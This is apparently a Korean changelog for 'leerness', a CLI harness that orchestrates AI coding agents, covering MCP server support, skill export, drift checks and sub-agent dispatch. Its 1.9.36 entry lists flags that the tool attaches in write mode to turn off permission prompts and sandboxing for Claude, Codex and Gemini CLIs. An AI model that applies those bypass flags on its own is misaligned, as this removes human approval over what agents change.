| 차분 마이그레이션 (1.9.41) | ✅ 3/3 — whats-new 13 버전, migrate stdout 자동 출력, report 영구 기록 |
| release pack (1.9.40) | ✅ 2/2 — --task-add, --parent-migrate dogfooding gap |
| drift + workflow (1.9.37-39) | ✅ 4/4 — 4 신호 + 4 레벨, --auto-fix, session-workflow.md, 6단계 가이드 |
| contract verify (1.9.35/36) | ✅ 2/2 — **require side-effect 차단 실측 검증** (852ms 정적 분석), tick.* 필드 grep |
| Edge cases | ✅ 5/5 (1.9.44 BOM 패치 후) — BOM, 한글, 빈 디렉토리, 50KB MCP 제한, 동시 호출 race |

### 검증
- e2e: **196/196 PASS** (195 + BOM 회귀 1건)
- stress-v2: **25/25 PASS** (이전 3 FAIL → BUG 1건 패치 + stress-v2 자체 결함 2건 수정)
- 검증 보고서: `_reports/INTEGRATION_TEST_REPORT_1.9.44.md` (사용자 전용 비공개)

### 결론
**1.9.34~44의 모든 13종 신규 기능 production-ready 확인**. 신규 사용자가 `npx leerness@1.9.44 init .`로 즉시 안전 사용 가능.

## 1.9.43 — 2026-05-19

**MCP 서버 + skill 일괄 export + _reports 비공개 + GitHub 배포 준비**.

[agentskills.io 분석](https://agentskills.io)에서 도출한 발전 로드맵의 Phase 1 즉시 후보 3건을 통합. leerness 도구를 **MCP 서버로 노출**하여 Claude Code · Hermes · Cursor 등 30+ 도구가 직접 호출 가능.

### Added — MCP Server (sub-agent로서 leerness)

- **`leerness mcp serve`** 신규 명령 — stdio JSON-RPC로 leerness 도구 10종 노출:
  - `leerness_handoff` · `leerness_drift_check` · `leerness_audit` (--fix 지원)
  - `leerness_verify_claim` (--run-tests, --strict-claims)
  - `leerness_contract_verify` (사양 ↔ 구현)
  - `leerness_agents_list` · `leerness_reuse_map` · `leerness_whats_new`
  - `leerness_usage_stats` · `leerness_session_close`
  - 표준 MCP 프로토콜 (2024-11-05) — initialize / tools/list / tools/call
- 이제 Claude Code · Hermes · Cursor 등이 `.mcp.json`에 leerness를 등록하면 메인 에이전트가 leerness 검수를 sub-tool로 호출 가능

### Added — skill 표준 export·discover

- **`leerness skill export-all [--out <dir>]`** — 모든 자체 skill(9개)을 agentskills.io 표준 `SKILL.md`로 일괄 export. 다른 도구가 `skill install <path>`로 즉시 import.

### Added — 내부 보고서 비공개

- **`_reports/` 디렉토리 자동 비공개**:
  - root `.gitignore`에 `_reports/`, `**/_reports/`, `*.private.md`, `*.private.json` 추가
  - `leerness-pkg/.gitignore`에 동일 추가
  - 신규 `leerness-pkg/.npmignore` — npm publish 시 명시적 제외
  - `package.json#files` 화이트리스트와 이중 안전
- 내부 검수 보고서 (`LEERNESS_VS_HERMES_AND_AGENTSKILLS.md`, `SESSION_LEERNESS_USAGE_AUDIT.md` 등)는 사용자 확인 전용이며 npm/GitHub 배포에 포함되지 않음

### Verified
- e2e: **195/195 PASS** (1.9.42 190 + 신규 5)
- MCP server initialize/tools/list 정상 JSON-RPC 응답
- skill export-all → 9개 SKILL.md 일괄 생성
- .gitignore/.npmignore에 _reports/ 차단 확인

### 정책
- ✅ MCP server는 명시 호출 (`leerness mcp serve`) 시에만 작동 — 자동 시작 안 함
- ✅ MCP 도구 호출 시 LEERNESS_NO_BANNER/NO_PROMPT/NO_DRIFT_CHECK 자동 설정 (호스트 환경 깔끔)
- ✅ _reports 비공개 — 다중 채널 (gitignore + npmignore + files 화이트리스트)

## 1.9.42 — 2026-05-19

**agentskills.io 공개 표준 호환 — 30+ AI 도구와 스킬 즉시 공유**.

[agentskills.io](https://agentskills.io)는 Anthropic이 만든 Agent Skills 개방 표준으로 Claude Code · Cursor · GitHub Copilot · OpenAI Codex · Gemini CLI · Hermes Agent · OpenHands · Goose 등 30+ 도구가 채택. 1.9.42부터 leerness가 이 표준의 `SKILL.md` 포맷을 import/export 가능.

### Added

- **`leerness skill install <url-or-path>`** 신규 명령 — `SKILL.md` 다운로드/import:
  - URL (https://...) 또는 로컬 파일/디렉토리 모두 지원
  - frontmatter (`name`, `description`) 파싱 → `.harness/skills/<id>/SKILL.md` 자동 배치
  - 자체 `skill.json` 도 함께 생성 (자체 catalog 호환, `_source: 'agentskills.io'` 추적)
- **`leerness skill discover [--query <q>] [--source <url>]`** 신규 명령 — 공개 스킬 카탈로그에서 매칭 추천:
  - **opt-in**: `LEERNESS_SKILL_DISCOVER_URL` 환경변수 또는 `--source` 명시 필요 (자동 외부 fetch 금지 정책 유지)
  - `--query` 키워드 매칭 + 마크다운 링크/SKILL.md URL 자동 추출
  - `--json` 출력 지원
- **`leerness skill export <id> [--out <dir>]`** 신규 명령 — 기존 자체 skill을 agentskills.io 표준 `SKILL.md` 포맷으로 export → 다른 도구가 `skill install`로 import 가능
- **`.env.example`에 2개 신규 환경변수** (opt-in, 기본 OFF):
  - `LEERNESS_SKILL_DISCOVER_URL=` — 공개 카탈로그 URL
  - `LEERNESS_SKILL_AUTO_DISCOVER=0` — 사용자 요청 분석 시 자동 매칭 추천
- **`_httpFetch()` 내장 HTTPS 호출자** — Node 18+ globalThis.fetch, fallback https module. 사용자 동의 명령에서만 호출.

### Reports
- `_reports/LEERNESS_VS_HERMES_AND_AGENTSKILLS.md` 작성 — 10 섹션 상세 분석:
  - agentskills.io 표준 + Progressive Disclosure 메커니즘
  - Hermes Agent (NousResearch, 157k ⭐, MIT) 분석
  - leerness 4 고유 우위 (거짓 완료 검증, drift 자동 감지, 워크스페이스 가시성, 마이그레이션 인지 갭)
  - 1.9.42 → 2.0 발전 로드맵 3 Phase

### 정책
- ❌ leerness는 외부 URL 자동 fetch 절대 금지 — opt-in (env 또는 `--source` 명시) 필수
- ✅ `_httpFetch`는 사용자 명령 (`skill install URL` / `skill discover`)에서만 호출
- ✅ 기존 자체 skillCatalog와 양립 — `_source: 'agentskills.io'`로 출처 추적

### e2e: 190/190 PASS (1.9.41 186 + 신규 4)

## 1.9.41 — 2026-05-19

**디스크 마이그레이션 ↔ AI 컨텍스트 인지 갭 차단 — 맞춤형 차분 마이그레이션**.

사용자 통찰: 같은 채팅 세션에서 leerness를 latest로 migrate해도, AI 에이전트는 이전 청크의 마인드셋으로 계속 작업하여 신규 도구(release pack, drift check 등)를 자동으로 호출하지 않는 패턴 발견. migrate는 파일만 업데이트, AI에겐 "새 도구가 들어왔다"는 신호 전달 부재.

### Added

- **`leerness whats-new [--from V] [--to V] [--json]`** 신규 명령 — CHANGELOG.md를 자동 파싱하여 두 버전 사이의 차분 추출:
  - 신규 명령 (`leerness X` 패턴), 신규 플래그 (`--xxx`), 신규 파일 (`.harness/*.md`) 자동 분류
  - 각 버전의 헤드라인 (`**...**` 또는 첫 라인) 추출
  - AI 가독 권장 행동 자동 출력
- **`migrate` 후 stdout에 AI must re-read 차분 자동 출력** — migrate 직전 이전 버전을 캡처 (`_previousVersion`) → CHANGELOG 차분 추출 → 신규 명령/파일을 stdout에 즉시 표시:
  - "이전 청크의 기억 무효 — 새 도구 우선 시도" 명시
  - 같은 세션 내 AI 인-컨텍스트에 신규 도구 인지 주입
- **`migration-report.md`에 "🤖 AI must re-read" 섹션 영구 기록** — 신규 명령/플래그/파일 + 버전별 헤드라인 + 권장 행동
- **`handoff`가 fresh migration-report (24h 내) 시 자동 알림** — "🆕 최근 N시간 전 migrate 차분" 블록 자동 표시. 같은 세션 내 매 handoff 호출이 AI에게 신규 도구 재안내.

### 발견된 시스템 결함 (이번 라운드 해결)
- ❌ **before 1.9.41**: migrate가 파일만 업데이트, AI 마인드셋 stale 유지 → 신규 도구 자동 호출 X
- ✅ **1.9.41 이후**: migrate 직후 stdout + migration-report.md + handoff 모두 신규 도구를 AI 가독 포맷으로 노출 → "잊을 수 없는" 차분 안내

### 자기 검증
- 의도적으로 root를 1.9.37로 되돌림 → `leerness migrate .` 호출 → **AI must re-read 차분 자동 stdout 출력**:
  - `📌 신규 명령: leerness release pack`
  - 1.9.38/1.9.39/1.9.40 버전별 헤드라인 자동 추출
  - 권장 행동 4단계 (--help, 신규 파일 재독, 인스트럭션 재독, whats-new --json)

### e2e: 186/186 PASS (1.9.40 182 + 신규 4)

### 정책
- ✅ 차분 안내는 **AI 가독 포맷** (`**📌**`, `` `leerness X` `` 등 마크다운)
- ✅ 같은 세션 내 다양한 채널 (stdout + report + handoff)로 *반복 노출* → 청크 stale 방지
- ✅ 추출은 CHANGELOG.md 파싱 — 새 라운드 마다 자동 갱신

## 1.9.40 — 2026-05-19

**dogfooding gap 차단 — `leerness release pack` 통합 명령 + audit README mismatch 자동 감지**.

세션 메타-감사(`_reports/SESSION_LEERNESS_USAGE_AUDIT.md`)에서 발견한 1.9.40 후보 4건을 모두 통합. 메인 에이전트가 "라운드 마감 = e2e/pack"으로만 끝내고 leerness 자체 마감을 잊는 패턴을 도구로 차단.

### Added

- **`leerness release pack [path]`** 신규 명령 — 라운드 마감 통합 워크플로:
  - `--dry-run` — 시뮬레이션 모드
  - `--task-add "<title>"` — progress-tracker에 라운드 마감 task 자동 등록
  - `--parent-migrate` — 부모 워크스페이스(`..`)의 `.harness`도 함께 latest로 migrate (dogfooding gap 차단)
  - `--close` — `session close` 자동 실행
  - `--no-readme-sync` — README 자동 동기화 스킵 (기본은 적용)
  - 사용 예: `leerness release pack . --task-add "1.9.41 X 통합" --parent-migrate --close`
- **`syncReadme` 자동 갱신 강화**:
  - `package.json#version` 또는 `.harness/HARNESS_VERSION` 기반 README의 version 배지 자동 갱신
  - `scripts/e2e.js`의 `total++` 카운트 기반 e2e 배지 추세 반영

### Fixed (audit 강화)

- **`leerness audit`에 README ↔ package.json version mismatch 자동 감지** — dogfooding gap의 가장 흔한 패턴 자동 차단:
  - `audit`: warning 출력
  - `audit --fix`: README 배지 자동 갱신
  - 메타 감사에서 발견한 "leerness-pkg는 1.9.40인데 README는 1.9.38" 같은 stale 사전 차단

### 정책
- ✅ `release pack`은 npm 호출 외엔 `.harness`만 갱신 (사용자 메모리 보존)
- ✅ `--parent-migrate`는 명시 플래그 필요 (자동 부모 변경 없음)
- ✅ README mismatch는 warning만 (failures가 아님 — 사용자 차단 X)

### 실측
- 메타 감사에서 발견한 4 후보 모두 통합
- e2e: 182/182 PASS (1.9.39 178 + 신규 4)
- 자체 검증: leerness-pkg에 `release pack --dry-run --task-add` 호출 → task T-0001 자동 등록

## 1.9.39 — 2026-05-19

**AI 하네스 엔지니어링 6단계 워크플로 자동 유도 + drift 자동 회복**.

사용자 우려: "프로젝트가 복잡해지고 길어질 때 leerness를 점점 참조하지 않는다" — 1.9.37/38 drift 감지에 이어, 이번엔 **매 세션 시작 시 워크플로 자체를 자동 안내**하는 능동형 메커니즘 추가.

### Added — A. 세션 워크플로 정책

- **`.harness/session-workflow.md`** 신규 — AI 하네스 엔지니어링 6단계 가이드:
  1. **요청 분석** (handoff + drift check)
  2. **계획 수립** (plan add / TodoWrite + reuse-map)
  3. **업무 분배** (agents list/recommend, 작업유형별 sub-agent 매핑)
  4. **sub-agent 작업** (파일 경로 격리, mtime 검증 의무, 자체 테스트)
  5. **종합 검증** (contract verify + verify-claim --run-tests + review --persona)
  6. **세션 마감** (session close + audit --fix + usage stats)
- **`handoff` 출력 끝에 6단계 가이드 자동 표시** — 매 세션 시작 시 메인 에이전트가 잊지 않도록.
- **AGENTS.md / CLAUDE.md 템플릿 업그레이드** — "⭐ 매 세션 첫 행동: session-workflow.md 먼저 읽기" 항목 최상단 추가, Mandatory read order 1번 위치.
- 스킵: `--no-workflow-guide` 또는 `LEERNESS_NO_WORKFLOW_GUIDE=1`.

### Added — B. drift 자동 회복

- **`leerness drift check --auto-fix`** — critical (≥100) 시 자동으로 `session close` 실행 + 재검증.
  - 회복 성공 시 usage-stats의 `drift.autoResolved` 카운터 누적
  - 실패 시 수동 실행 안내
- **`leerness handoff --auto-recover`** — handoff 진입 시 severe drift 감지하면 inline 자동 회복.
  - sevStale (≥3일) 시에만 발동 (안전)

### 정책
- ✅ `--auto-fix`/`--auto-recover`는 **명시적 플래그** 필요 (기본 동작은 알림만 유지)
- ✅ 워크플로 가이드는 매 handoff 출력에 표시 → 메인 에이전트가 매 세션 6단계 인지
- ✅ AGENTS/CLAUDE 템플릿 통합 → AI 에이전트가 세션 시작 시 자동 읽음

### 실측
- 워크플로 가이드 정상 표시 (handoff 끝에 6 단계 + .harness/session-workflow.md 링크)
- session-workflow.md init 시 자동 생성 (6단계 + 사용 명령 + anti-pattern 명시)
- AGENTS/CLAUDE에 session-workflow.md 참조 자동 inject

### e2e: 178/178 PASS (1.9.38 174 + 신규 4)

## 1.9.38 — 2026-05-18

**drift 자동 reminder + 사용 통계 + TodoWrite 임포트 + drift 임계 학습**.

1.9.37의 drift detection을 더 능동적으로 만든 라운드. 메인 에이전트가 leerness를 "잊는" 시나리오를 4가지 채널로 보완.

### Added

- **(A) `.harness/agent-reminders.md` 자동 생성** — drift 5일 이상(severe) 시 handoff 진입부에서 자동 생성. 메인 에이전트가 다음 라운드 시작 시 이 파일을 읽고 session close를 잊지 않도록.
  - drift 회복 시 (handoff/session close) 파일 자동 청소
- **(B) `leerness usage stats`** 신규 명령 — `.harness/cache/usage-stats.json`에 명령별 누적 카운터 + drift 통계. `--json` 출력 지원.
  - 매 명령 호출 시 자동 누적 (`_bumpUsage`)
  - 통계 출력: 호출 수 상위 30 + drift critical 발견/skip/자동 해소 카운트
- **(C) `leerness task sync --from <todo.json>`** 신규 명령 — TodoWrite JSON을 leerness progress-tracker로 import. completed → done, in_progress → in-progress, pending → planned 매핑.
  - 같은 content가 이미 있으면 status만 update, 없으면 신규 task 생성
  - `--json` 출력 지원
- **(D) drift 임계 학습** — `--no-drift-check` 누적 ≥5회 시 stale 임계 2일 → 4일로 자동 완화 (false alarm 감소).
  - usage-stats.json의 `drift.skipped` 카운터로 추적
  - 학습된 임계 활성 시 handoff 출력에 "(학습: skip N회 누적 → 임계 N일 완화)" 안내

### 실측
- 실 워크스페이스에서 4 기능 모두 작동 확인:
  - A: 5일 stale 시뮬 → agent-reminders.md 자동 생성 (drift critical 메시지)
  - B: status/handoff/task 명령 자동 카운트
  - C: 2건 TodoWrite JSON → 2건 progress-tracker import
  - D: --no-drift-check 5회 누적 → drift.skipped=5 기록

### e2e: 174/174 PASS (1.9.37 170 + 신규 4)

### 정책
- ✅ 자동 reminder는 *파일 생성*만 — 메인 에이전트 자동 실행 강제 X
- ✅ usage stats는 read-only 추적, destructive 동작 X
- ✅ task sync는 idempotent (같은 content는 update만)
- ✅ drift 학습은 사용자 친화 (자주 끄면 덜 짖게)

## 1.9.37 — 2026-05-18

**메인 에이전트의 "leerness 점점 안 쓰는" drift 현상 자동 감지·경고**.

### 배경
실 워크스페이스 분석 결과: 라운드가 길어질수록 메인 에이전트가 `session close` / `task add` 등을 점점 잊는 패턴 발견.
- session-handoff.md 4.6일 stale
- task-log.md 4.6일 stale
- progress-tracker T-row 3일간 0건 업데이트
- 신규 sub-app 4개에 task 0건 등록

→ **drift score 100/200 (🔴 critical) 등급**. 사용자 우려 사실 확인.

### Added

- **`leerness drift check [path]`** 신규 명령:
  - 4개 신호 측정: session-handoff.md, current-state.md, progress-tracker.md, task-log.md의 staleness
  - 추가 신호: `_apps/*` 중 task 0건인 sub-project 수
  - 가중치 합계 → 4단계 레벨 (🟢 healthy / 🟠 attention / 🟡 warning / 🔴 critical)
  - 임계 0/20/50/100. 점수 ≥100 시 exit 1 (CI 친화)
  - `--json` 출력 지원
  - 권장 조치 자동 안내 (`session close` / `audit --fix` / `task add`)
- **`handoff` 자동 drift 경고** — handoff 호출 시 빠른 inline check (전체 `drift check` 안 호출). session-handoff/progress-tracker 중 하나라도 2일 이상 stale이면 노랑색 경고 + 권장 명령 안내.
- **스킵 옵션**: `--no-drift-check` 플래그 + `LEERNESS_NO_DRIFT_CHECK=1` 환경변수

### 실측 (이번 라운드)
- 실 워크스페이스: drift 100/200 (critical) → `session close` 1회 후 30/200 (attention)
- e2e: 170/170 PASS (1.9.36 166 + 신규 4)

### 정책
- ✅ drift 경고는 *알림만* — 자동 실행 금지 (사용자/메인이 명시적 선택)
- ✅ 빠른 inline check (handoff) vs 상세 보고 (`drift check`) 분리
- ✅ CI 친화: `--no-drift-check` 또는 env로 끄기 가능

## 1.9.36 — 2026-05-18

**외부 AI CLI 오케스트레이션 강화: dispatch 안전 모드 + agents bench + 작업 유형 추천 + stress test에서 발견한 2 BUG 즉시 수정**.

### Added

- **`leerness agents bench "<task>" [--write] [--timeout N]`** — 활성/설치된 모든 ready CLI에 같은 task를 동시 호출. 결과: 시간/exit/응답길이/마지막 라인 비교 매트릭스 + 🏆 가장 빠른 CLI 자동 표시. `--json` 출력 지원.
- **`agents dispatch`에 `--write` 모드 추가** — 기본은 read-only (안전). `--write` 명시 시 각 CLI에 위험 플래그 자동 첨부:
  - claude → `--print --dangerously-skip-permissions`
  - codex → `exec --skip-git-repo-check --dangerously-bypass-approvals-and-sandbox`
  - gemini → `-p --yolo`
- **`_recommendAgent()` 작업 유형 기반 CLI 추천** — task 키워드 분석:
  - 번역/요약/분석/review → **claude** (1.7× 빠름)
  - 아키텍처/리팩터/복잡 → **codex** (가장 상세)
  - 생성/작성/수정/구현 → **gemini --yolo** (직접 수정 정확)
  - ready 체크 전에 출력 → 비활성이어도 추천 안내
- **`dispatch` 출력에 CLI별 안내 추가** — codex의 POSIX path 변환 차이, gemini의 yolo 위험성 등.

### Fixed (stress test에서 발견된 진짜 BUG)

- 🔴 **`contract verify` require() side-effect 제거** — `require(implFile)`가 스크립트 본문 실행 → 18초 소요 + 임의 코드 실행 위험. **정적 소스 분석** (`module.exports = {...}` / `exports.foo =` 패턴 grep)으로 교체. 18,245ms → **705ms (25.9× 빠름)** + 보안 위험 제거.
- 🟡 **`reuse autodetect` 디렉토리 제한 해제** — `src/`만 스캔 → **src/, bin/, lib/, app/ 4개 디렉토리** 스캔. require → 정적 분석.

### Verified
- 신규 프로젝트 `_apps/leerness-stress` 생성 + 31개 leerness 명령 자동 호출 stress test
- 결과: 28 PASS / 3 의도된 BUG 감지 (false positive 0건)
- e2e: 166/166 PASS (1.9.35 161 + 신규 5)

## 1.9.35 — 2026-05-17

**파이프라인 메타-감사에서 도출된 5개 개선 사항 통합**.

이전 라운드(1.9.34)에서 멀티 에이전트 오케스트레이션 전체 파이프라인을 메타-검증한 결과 8개 개선점을 도출. 그 중 high-impact 5건을 1.9.35에 즉시 통합.

### Added

- **`leerness contract verify <spec.md> <impl.js>`** (#3) — 사양 ↔ 구현 일치 검사.
  - spec 문서에서 `function fooBar(` / `` `bar(` `` / `tick.<field>` 패턴 추출
  - impl의 `module.exports`와 비교 → 누락된 함수/필드 보고
  - `--json` 출력 지원, exit code 1 if 불일치 (CI 친화)
  - 1.9.34 멀티 에이전트 검증에서 발견한 "tick 페이로드 필드명 불일치" 자동 차단
- **`leerness reuse autodetect [path]`** (#2) — `src/*.js`의 `module.exports`를 스캔하여 reuse-map.md 후보 자동 등록.
  - `_internal` 헬퍼는 제외 (밑줄로 시작하는 export 자동 필터)
  - `--apply`로 reuse-map.md에 자동 추가, 기본은 dry-run
- **`leerness audit --fix`** (#5) — 누락된 메타 파일 자동 갱신.
  - `session-handoff.md`의 `Last generated: (자동)` → 실제 타임스탬프
  - `current-state.md`의 stale `Updated` 라인 → today로 갱신
  - `--fix` 미지정 시 기존 경고 동작 유지 (안전한 opt-in)
- **`handoff <path>` .harness 부재 자동 경고** (#1) — 신규 디렉토리에서 handoff 호출 시 즉시 노랑색 경고 + `leerness init` 명령 안내. `--no-init-check` 또는 `--all-apps` 시 스킵.
- **`agents dispatch` 안내문에 안전 규칙 추가** (#4) — 멀티 에이전트 분배 시 파일 경로 격리, mtime 검증 요구, contract verify 권장을 안내문에 자동 포함.

### Policy
- ✅ 모든 신규 명령은 기본 read-only · destructive 동작은 명시적 플래그(`--fix`, `--apply`) 필요
- ✅ 1.9.34 멀티 에이전트 검증의 모범 사례(파일 경로 격리, mtime 자기 검증, 사양 사전 합의)를 도구로 코드화
- ❌ 자동 init은 destructive이므로 자동 실행 안 함 — 사용자에게 명령만 안내

### 실측 (이번 라운드)
- 메타-감사 보고서: `_reports/PIPELINE_META_AUDIT.md` (10 phases, 8 개선점)
- rpg-replay 통합 패치: 회귀 0건 · 128/128 PASS · BUG-A/B/C 모두 해결 (별도 라운드)
- contract verify 실 사용 사례: format.js에 spec의 `tick.effect` 필드 없음 발견
- e2e: 161/161 PASS (1.9.34 156 + 신규 5)

## 1.9.34 — 2026-05-16

**방향키 + 스페이스 인터랙티브 multi-select + 256색 그라데이션 배너 + 멀티레벨 sub-agent 오케스트레이션 검증**.

### Added

- **`_selectOne()` / `_selectMany()` 헬퍼**: TTY raw mode + readline 이벤트 처리.
  - 방향키 ↑↓ (또는 j/k vim binding) — 커서 이동
  - Space — 토글 (multi-select)
  - a / n — 전체 선택 / 전체 해제
  - Enter — 확정
  - q / ESC / Ctrl+C — 취소 (기본값 또는 빈 배열 반환)
- **`resolveInstallOptions`에 적용**: 언어 선택 + 스킬 라이브러리 선택을 multi-select UI로 전환.
- **`setupAgentsCmd`에 적용**: 4 CLI 일괄 활성화를 Space 토글로 선택 (이전엔 각각 yes/no 4번).
- **ASCII 배너 256색 그라데이션**: 6 라인을 cyan(51) → 자주(165)로 6단계 그라데이션. ★ 강조 + magenta 색 강조 항목.
- **`--no-interactive-select` 플래그 + `LEERNESS_NO_INTERACTIVE=1` env**: 구식 숫자 prompt 폴백.

### 멀티레벨 sub-agent 오케스트레이션 검증 (실측)

메인 에이전트 → sub-agent(Claude) → sub-sub-agent(외부 gemini CLI) 3단계 깊이 검증.

| 항목 | 결과 |
|---|---|
| 단일 gemini 호출 | ✅ 15.6s, 영문 번역 정상 |
| 병렬 ×2 | ✅ 24s, 출력 분리 정상 (quota retry 1회) |
| 효율 (순차 3회 33s vs 병렬 3회 15s) | **2.2× 향상** (이론 3× 대비 60%) |
| 검수 체인 (결과 → 평가) | ✅ "2" → "yes" 정상 |
| 같은 파일 동시 쓰기 | ⚠ **last-writer-wins, 락 없음 → 데이터 손실 위험** |

**결론**:
- 3단계 오케스트레이션 안전하게 동작
- 독립 작업(번역/평가/리뷰) 2×+ 효율 향상
- 같은 리소스 동시 쓰기는 호출자가 파일 경로 격리 책임
- gemini quota 동시 호출 시 retry → 병렬 확장성 ~3개로 제한

### Policy
- ❌ 비-TTY/CI/`--yes` 시 multi-select prompt 자동 스킵 (defaults 사용)
- ❌ 같은 파일/리소스 동시 쓰기 sub-agent 분배 금지 (호출자 책임)
- ✅ 인터랙티브 prompt는 256색 ANSI 미지원 환경에서도 동작 (`LEERNESS_NO_INTERACTIVE=1` 폴백)
- ✅ q/ESC로 언제든 취소 가능 (기본값으로 fallback)

### 실측 (이번 라운드)
- 워크스페이스 28 프로젝트 일괄 1.9.16~1.9.31 → 1.9.33 → 1.9.34 마이그레이션
- e2e: 156/156 PASS (1.9.33 153 + multi-select 폴백 + 배너 + --no-interactive-select 3개)

## 1.9.33 — 2026-05-15

**npx 캐시 함정 방지 — install 시 stale 버전 자동 경고 + 해결 안내**.

### 배경
사용자가 `npx leerness init`(@latest 없이)을 실행하면 npm/npx의 로컬 캐시에 있는 옛 버전이 무한히 재사용되는 함정이 있음. 1.9.32 publish 후에도 사용자 PC에서 1.9.21이 실행되는 사례 확인.

### Added

- **`_warnIfStale()` 헬퍼**: `install()` 진입 시 자동 호출.
  - npm registry latest 비교 (`fetchNpmLatest` + 24h cache 재사용)
  - 현재 실행 중인 VERSION이 registry latest보다 옛날이면 ⚠ 노랑색 경고 박스 출력
  - 해결 명령 2가지 안내: `npx --yes clear-npx-cache && npx leerness@latest init .` 또는 `npm i -g leerness@latest`
  - **init 자체는 계속 진행** (경고만 띄움 — 강제 차단 X)
- **`--no-stale-check`** 플래그 + **`LEERNESS_NO_STALE_CHECK=1`** env 변수: 경고 스킵
- **offline + 캐시 없음**: 비교 스킵 (네트워크 차단 환경 안전)
- **offline + 캐시 fresh**: 캐시값으로 비교 (e2e 등 CI 환경에서도 동작)

### Policy
- ❌ 사용자 init 차단 안 함 (경고만, init은 계속 진행)
- ✅ 24h 캐시로 매 init마다 npm view 호출 안 함 (cold-start만 12s timeout)
- ✅ 네트워크 실패 시 silently skip — init 흐름 끊지 않음
- ✅ `--no-stale-check`/env로 끄기 가능 (CI 친화)

### 실측 (이번 라운드)
- 사용자 PC: `npx leerness init` → 1.9.21 실행됨 (npm latest=1.9.32) — 1.9.33부터 install 시 즉시 경고
- e2e: 153/153 PASS (1.9.32 151 + stale 경고/스킵 2)

## 1.9.32 — 2026-05-15

**ASCII 배너 + `leerness setup-agents` 인터랙티브 설정 + 미설치 CLI 자동 설치 시도**.

### Added

- **ASCII 배너 (`_banner()`)**: `leerness init` 시 자동 출력. `--version --banner`로도 호출 가능. `LEERNESS_NO_BANNER=1` 또는 콘솔 폭 <70칸이면 자동 스킵.
  - `LEERNESS` 8글자 ANSI 시안+볼드 색상 + 박스 + 빠른 시작 4줄.
- **`leerness setup-agents [path]`** (신규 명령): 외부 AI CLI 4종 (claude/codex/gemini/copilot) 인터랙티브 활성화.
  - 각 CLI별: 설치 상태(🟢/⚪) + 활성 상태(🟢/🟡) 표시 → 사용자 yes/no → `.env`의 `LEERNESS_ENABLE_*` 자동 upsert.
  - **미설치 CLI 자동 설치 시도**: 사용자 동의 후 `npm i -g @anthropic-ai/claude-code`, `npm i -g @openai/codex`, `npm i -g @google/gemini-cli`, `gh extension install github/gh-copilot` 실행.
  - 설치 후 PATH 재확인 → 안 보이면 새 셸 안내.
- **`init` 후 자동 prompt**: `leerness init`이 끝나면 TTY일 때 "외부 AI CLI 설정?" 질문 → yes 시 `setupAgentsCmd` 호출.
  - `--no-setup-agents` 또는 `--yes`로 스킵 가능.
- **`EXTERNAL_AGENTS`에 `installCmd` + `installHint` 필드 추가**: 자동 설치 시 사용.
- **`_prompt()` / `_confirm()` / `_upsertEnvLine()` 헬퍼**: TTY 한정 readline 기반, 비대화형(--yes/CI/non-TTY)에선 안전 fallback.

### Policy
- ❌ 비-TTY/CI 환경에선 prompt 자동 스킵 (default 동작 유지)
- ❌ 자동 설치는 사용자 명시적 yes 후에만 (--yes 시에도 prompt 스킵하므로 자동 설치 안 됨)
- ✅ `.env` upsert는 idempotent (이미 키가 있으면 값 교체만)
- ✅ `init --yes` + `setup-agents`로 비대화형 워크플로도 안내 표시만 (변경 없음)

### 실측 (이번 라운드)
- 신규 sub-project 3종 (rpg-craft 20/20, rpg-achievements 22/22, rpg-instance 20/20) — sub-agent 3 동시
- e2e: 151/151 PASS (1.9.31 146 + 1.9.32 5)
- 배너 ANSI 시각 검증 OK / 콘솔 폭 <70칸 시 1줄 폴백 / `LEERNESS_NO_BANNER=1` 스킵

## 1.9.31 — 2026-05-15

**`leerness agents quota` — 외부 AI CLI 사용량/한도 추정 + provider 대시보드 안내**.

### Added

- **`leerness agents quota`** (1.9.31): 활성 CLI별 quota/rate-limit 정보 표시.
  - **claude**: 비대화형 quota API 없음 → `/status` 슬래시 또는 https://console.anthropic.com/settings/usage 안내.
  - **codex**: `codex --help`에서 `usage`/`quota` 키워드 감지 시 시도 가능 표시, 미감지 시 https://platform.openai.com/account/usage 안내.
  - **gemini**: 무료 티어 `60 req/min, 1000 req/day` 명시.
  - **copilot (gh)**: `gh auth status`로 인증 확인 → 구독자 무제한 또는 `gh auth login` 필요 안내.
  - `--json` 출력 지원 (`{ quota: [{id, bin, status, quota, hint, raw}, ...] }`).
- **`agents` 사용법 메시지에 `quota` 추가**: `list|check|quota|dispatch`.
- **`agents dispatch` 안내문에 quota 명령 cross-link** (1.9.31+).

### Policy
- ❌ leerness는 사용량을 직접 추적하지 않음 (provider 대시보드 참조)
- ✅ sub-agent 분배 시 quota 여유 큰 CLI를 메인 에이전트가 우선 선택하도록 신호 제공
- ✅ rate-limit/plan 차이는 provider별 다름 — leerness는 hint만 제공

### 실측 (이번 라운드 사용 사례)
- agents quota 신규 명령 검증 후 sub-agent ×3 동시 분배
- e2e: 146/146 통과 (1.9.30 144 + quota 2)

## 1.9.30 — 2026-05-15

**외부 AI CLI 오케스트레이션 — 환경변수 활성화 정책 + `leerness agents list/check/dispatch`**.

claude/codex/gemini/copilot CLI들을 sub-agent로 명시적 활용 가능. 사용자 동의(환경변수) + PATH 존재 둘 다 충족 시에만 ready.

### Added

- **`.env.example`에 4개 활성화 플래그 추가**:
  - `LEERNESS_ENABLE_CLAUDE=1` (Anthropic Claude Code, 기본 활성)
  - `LEERNESS_ENABLE_CODEX=0` (OpenAI Codex CLI, 격리 sandbox)
  - `LEERNESS_ENABLE_GEMINI=0` (Google Gemini CLI, `--yolo` 모드는 워크스페이스 직접 수정 가능)
  - `LEERNESS_ENABLE_COPILOT=0` (GitHub Copilot CLI = `gh copilot`)
- **`leerness agents list`**: 4 CLI별 (env=1 여부) + (PATH 존재 여부) + 버전 + 상태 (ready/disabled/not-installed) 표 출력. `--json` 지원.
- **`leerness agents check`**: alias of list (재확인 강조).
- **`leerness agents dispatch "<task>" --to <id>`**: 활성 ready CLI에 대상 명령 자동 생성 (`claude "..."`, `codex exec "..."`, `gemini -p "..." --yolo`, `gh copilot suggest "..."`).
  - **leerness는 자동 호출 안 함** — 사용자/메인 에이전트가 명시적 실행.
  - 비활성/미설치 시 안내 후 `exit 1`.

### Policy
- ❌ 환경변수 미설정 또는 PATH 없으면 dispatch 거부
- ✅ 환경변수 + PATH 둘 다 충족 시에만 ready
- ✅ leerness는 외부 CLI 자동 호출 금지 (1.9.22 Ollama opt-in과 동일 원칙)

### 실측 (이번 라운드 사용 사례)
- Claude sub-agent ×2 (PvP 매치메이킹 + 길드 시스템) → 각각 26/26, 23/23 통과
